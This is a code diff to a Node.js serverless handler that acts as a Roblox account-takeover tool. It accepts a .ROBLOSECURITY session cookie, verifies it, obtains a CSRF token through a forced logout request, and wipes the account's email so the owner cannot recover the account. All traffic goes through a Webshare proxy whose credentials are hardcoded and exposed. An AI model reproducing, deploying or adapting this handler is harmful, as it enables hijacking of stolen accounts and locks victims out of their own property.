@@ -1,5 +1,4 @@
 const axios = require('axios');
-const { HttpsProxyAgent } = require('https-proxy-agent');
 
 module.exports = async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -13,9 +12,15 @@ module.exports = async function handler(req, res) {
 
     const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
     
-    // YOUR WEBSHARE PROXY
-    const proxyUrl = 'http://zsotdpxo:l7za2lzgqish@p.webshare.io:80';
-    const agent = new HttpsProxyAgent(proxyUrl);
+    // Native Axios Proxy Config (Fixes the 407 error)
+    const proxyConfig = {
+        host: 'p.webshare.io',
+        port: 80,
+        auth: {
+            username: 'zsotdpxo',
+            password: 'l7za2lzgqish'
+        }
+    };
 
     const baseHeaders = {
         'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
@@ -29,14 +34,14 @@ module.exports = async function handler(req, res) {
     try {
         // 1. Verify Cookie
         const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
-            headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 8000 
+            headers: baseHeaders, proxy: proxyConfig, timeout: 8000 
         });
 
         // 2. Get CSRF Token
         let csrfToken = '';
         try {
             await axios.post('https://auth.roblox.com/v2/logout', {}, { 
-                headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 8000 
+                headers: baseHeaders, proxy: proxyConfig, timeout: 8000 
             });
         } catch (err) {
             if (err.response && err.response.headers['x-csrf-token']) {
@@ -50,7 +55,7 @@ module.exports = async function handler(req, res) {
         // 3. Wipe Email
         try {
             await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
-                headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 8000 
+                headers: baseHeaders, proxy: proxyConfig, timeout: 8000 
             });
             return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
         } catch (err) {
@@ -61,6 +66,9 @@ module.exports = async function handler(req, res) {
         }
 
     } catch (error) {
+        if (error.response && error.response.status === 407) {
+             return res.status(407).json({ success: false, message: 'Proxy Authentication Failed. Check Webshare credentials.' });
+        }
         if (error.response && error.response.status === 401) {
             return res.status(401).json({ success: false, message: 'Cookie is invalid, expired, or proxy failed.' });
         }
